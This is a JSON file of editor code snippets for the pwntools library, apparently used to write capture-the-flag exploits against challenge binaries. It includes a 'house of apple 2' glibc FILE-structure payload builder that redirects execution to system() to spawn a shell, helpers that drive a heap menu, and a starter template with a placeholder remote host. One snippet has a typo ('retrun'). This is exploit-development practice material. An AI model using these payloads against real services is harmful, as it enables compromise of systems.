{
  "[pocwriter] pwntools house of apple": {
    "scope": "python",
    "prefix": "def house_of_apple",
    "body": [
      "def house_of_apple_sys():",
      "  io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']",
      "  sys_addr = libc_base + libc.sym['system']",
      "  ",
      "  payload = p32(0xfffff7f5) + b\";sh\\x00\" + p64(0)",
      "  payload+= p64(0)*2",
      "  payload+= p64(0) + p64(1)",
      "  payload+= b\"\\x00\"*0x38 + p64(sys_addr) + b\"\\x00\"*0x30 + p64(heap_base+0x0) # payload头地址",
      "  payload+= b\"\\x00\"*0x30+ p64(io_wfile_jumps)",
      "  payload+= p64(heap_base+0x0) # payload头地址",
      "  retrun payload"
    ],
    "description": "pwntools' house of apple 2 template (No sandbox)"
  },
  "[pocwriter] pwntools heap exploit function alias": {
    "scope": "python",
    "prefix": "def malloc(size",
    "body": [
      "s       = lambda data               :p.send(data)",
      "sl      = lambda data               :p.sendline(data)",
      "sa      = lambda x,data             :p.sendafter(x, data)",
      "sla     = lambda x,data             :p.sendlineafter(x, data)",
      "",
      "def malloc(size,content):",
      "    sla('Your choice :',b'1')",
      "    sla('Size of Heap : ',str(size))",
      "    sa('Content',content)",
      "",
      "def edit(index,content):",
      "    sla('Your choice :',b'2')",
      "    sla('Index :',str(index))",
      "    sla('Size of Heap : ',str(len(content)))",
      "    sla('Content of heap : ',content)",
      "",
      "def free(index):",
      "    sla('Your choice :',b'3')",
      "    sla('Index :',str(index))",
      "",
      "def show(index):",
      "    sla('Your choice :',b'4')",
      "    sla('Index :',str(index))"
    ],
    "description": "pwntools heap exploitation malloc/free operation reusable snippet"
  },
  "[pocwriter] pwntools initial template": {
    "scope": "python",
    "prefix": "from pwn import *",
    "body": [
      "from pwn import *",
      "from ctypes import *",
      "",
      "context(arch='amd64', log_level = 'debug',os = 'linux')",
      "file='./chall'",
      "elf=ELF(file)",
      "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')",
      "",
      "choice = 0x00",
      "if choice:",
      "  port=   27828",
      "  target = 'remote.host'",
      "  p = remote(target,port)",
      "else:",
      "  p = process(file)",
      "",
      "s       = lambda data               :p.send(data)",
      "sl      = lambda data               :p.sendline(data)",
      "sa      = lambda x,data             :p.sendafter(x, data)",
      "sla     = lambda x,data             :p.sendlineafter(x, data)",
      "r       = lambda num=4096           :p.recv(num)",
      "rl      = lambda num=4096           :p.recvline(num)",
      "ru      = lambda x                  :p.recvuntil(x)",
      "itr     = lambda                    :p.interactive()",
      "uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))",
      "uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))",
      "uru64   = lambda                    :uu64(ru('\\x7f')[-6:])",
      "leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))",
      "libc_os   = lambda x                :libc_base + x",
      "clear       =       lambda                            : os.system('clear')",
      "",
      "def get_sb():",
      "  return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))",
      "",
      "def debug(cmd=''):",
      "  if choice==1:",
      "    return  ",
      "  gdb.attach(p,gdbscript=cmd)",
      "",
      "def malloc(size,content):",
      "  pass",
      "",
      "def edit(index,content):",
      "  pass",
      "",
      "def free(index):",
      "  pass",
      "",
      "def show(index):",
      "  pass",
      "  ",
      "commend = '''",
      "b main",
      "'''",
      "debug(commend)",
      "",
      "itr()"
    ],
    "description": "pwntools init template"
  }
}